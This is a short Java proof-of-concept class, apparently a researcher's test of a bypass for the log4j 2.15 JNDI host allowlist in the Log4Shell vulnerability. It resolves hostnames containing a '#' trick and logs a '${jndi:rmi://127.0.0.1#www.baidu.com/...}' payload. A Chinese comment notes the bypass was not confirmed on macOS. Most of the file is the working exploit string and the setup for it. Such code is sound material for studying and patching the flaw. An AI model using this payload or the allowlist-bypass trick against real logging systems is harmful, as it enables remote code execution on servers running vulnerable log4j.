import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.net.InetAddress;

public class rcebyPass {
    private static final Logger logger = LogManager.getLogger(rcebyPass.class);
    public static void main(String[] args) throws Exception{
        System.out.println(InetAddress.getByName("127.0.0.1"));
        System.out.println(InetAddress.getByName("www.baidu.com"));
//        System.out.println(InetAddress.getByName("127.0.0.1#.www.baidu.com"));
        System.out.println(InetAddress.getByName("127.0.0.1#www.baidu.com"));
        /*
        * 在MacOS下可以bypass未验证成功
        * */
        logger.error("${jndi:rmi://127.0.0.1#www.baidu.com/q1bfjd}");
    }
}



